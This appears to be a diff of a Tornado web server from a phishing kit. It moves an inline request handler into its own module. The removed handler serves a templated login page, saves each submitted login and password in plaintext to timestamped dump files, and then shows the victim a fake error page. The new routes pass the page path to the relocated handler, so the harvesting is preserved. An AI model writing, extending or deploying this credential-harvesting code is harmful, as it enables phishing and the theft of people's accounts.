@@ -12,6 +12,7 @@ import tornado.process
 import tornado.web
 # from tornado import gen
 
+from server.Handlers.MainHandler import MainHandler
 from server.Handlers.APIHandler import APIHandler
 from server.Handlers.AdminHandler import AdminHandler
 
@@ -24,46 +25,15 @@ http_port = 8080
 https_port = 4430
 
 
-class MainHandler(tornado.web.RequestHandler):
-    @tornado.web.asynchronous
-    # @gen.coroutine
-    async def data_received(self, chunk):
-        pass
-
-    @tornado.web.asynchronous
-    # @gen.coroutine
-    async def get(self):
-        self.render('pages/' + pagePath + 'index.html')
-
-    def post(self):
-        try:
-            login = self.get_argument('login')
-            password = self.get_argument('password')
-            try:
-                if not os.path.exists('logs/dump/' + pagePath):
-                    os.mkdir('logs/dump/' + pagePath)
-                file = open('logs/dump/' + pagePath + str(time.time()), mode='a+')
-                file.write('login:' + login + '\npassword:' + password + '\n')
-                file.close()
-            except IOError:
-                print(pagePath)
-                print('login :', login)
-                print('password :', password)
-        except tornado.web.HTTPError:   # no or wrong arguments
-            pass
-        # show an error page to the client
-        self.render('pages/' + pagePath + 'error.html')
-
-
 def main():
     # create an instance
     application = tornado.web.Application([
             (r'/rsc/(.*)', tornado.web.StaticFileHandler, {'path': 'rsc/'}),
             (r'/API/(.*)$', APIHandler),
             (r'/admin', AdminHandler),
-            (r'/admin/.*', AdminHandler),
-            (r'/', MainHandler),
-            (r'/.*', MainHandler)
+            (r'/admin/(.*)$', AdminHandler),
+            (r'/', MainHandler, dict(page_path=pagePath)),
+            (r'/.*', MainHandler, dict(page_path=pagePath))
         ])
     # HTTP socket
     http_socket = tornado.netutil.bind_sockets(http_port)
